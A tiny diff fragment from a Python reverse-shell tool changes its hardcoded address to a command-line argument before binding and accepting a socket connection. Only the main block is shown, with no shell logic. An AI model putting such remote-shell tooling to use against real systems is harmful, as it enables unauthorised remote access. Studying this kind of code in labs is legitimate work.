@@ -56,6 +56,6 @@ class ReverseShell():
 
 
 if __name__=="__main__":
-	shell = ReverseShell("127.0.0.2",9999)
+	shell = ReverseShell(sys.argv[1],9999)
 	shell.bind_socket()
 	shell.socket_accept()
